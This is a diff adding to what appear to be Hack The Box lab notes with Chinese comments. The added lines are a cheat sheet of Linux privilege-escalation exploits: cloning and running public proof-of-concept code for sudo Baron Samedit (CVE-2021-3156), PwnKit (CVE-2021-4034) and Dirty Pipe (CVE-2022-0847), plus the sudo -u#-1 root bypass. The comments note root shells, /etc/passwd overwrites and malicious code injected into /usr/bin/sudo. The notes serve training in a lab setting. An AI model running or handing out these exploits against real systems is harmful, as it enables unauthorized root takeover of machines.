@@ -307,3 +307,31 @@ import os
   ————————————
 sudo /usr/bin/python3 /home/htb-student/mem_status.py            夺旗
 
+
+git clone https://github.com/blasty/CVE-2021-3156.git
+cd CVE-2021-3156
+make
+cat /etc/lsb-release
+./sudo-hax-me-a-sandwich
+./sudo-hax-me-a-sandwich 1            1 是对应 Linux 版本的选项
+
+
+sudo -u#-1 id      -u 后面加 # 数字，代表 UID，-1 转换成了 0，即 root，id 可以换成恶意脚本
+
+
+git clone https://github.com/arthepsy/CVE-2021-4034.git
+cd CVE-2021-4034
+gcc cve-2021-4034-poc.c -o poc
+chmod +x poc
+./poc            获得 root shell
+
+
+
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+cd CVE-2022-0847-DirtyPipe-Exploits
+bash compile.sh
+uname -r                            查看内核版本
+./exploit-1                         自动化修改 /etc/passwd， 获得 root shell
+find / -perm -4000 2>/dev/null      查找 SUID 二进制文件
+./exploit-2 /usr/bin/sudo           自动化修改 /usr/bin/sudo，插入恶意代码，获得 root shell，并恢复 /usr/bin/sudo
+
